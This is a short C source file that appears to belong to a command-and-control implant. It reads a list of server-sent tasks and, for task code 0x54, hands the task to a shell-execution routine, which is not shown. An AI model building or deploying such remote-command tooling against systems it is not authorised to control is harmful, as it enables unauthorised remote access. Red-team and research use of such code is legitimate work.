#include "Command.h"



BOOL handleGetTasking(PParser getTasking)
{
	UINT32 numTasks = getInt32(getTasking);
	for (UINT32 i = 0; i < numTasks; i++)
	{
		SIZE_T sizeTask = getInt32(getTasking) - 1;
		BYTE task = getByte(getTasking);
		PBYTE taskBuffer = getBytes(getTasking, &sizeTask);
		PParser taskParser = newParser(taskBuffer, sizeTask);

		if (task == 0x54)
		{
			executeShell(taskParser);
		}

	}

	return TRUE;
}







BOOL commandDispatch(PParser response)
{
	BYTE typeResponse = getByte(response);
	if (typeResponse == 0)
		return FALSE;
	else if (typeResponse == 1)
		return FALSE;

	return TRUE;
}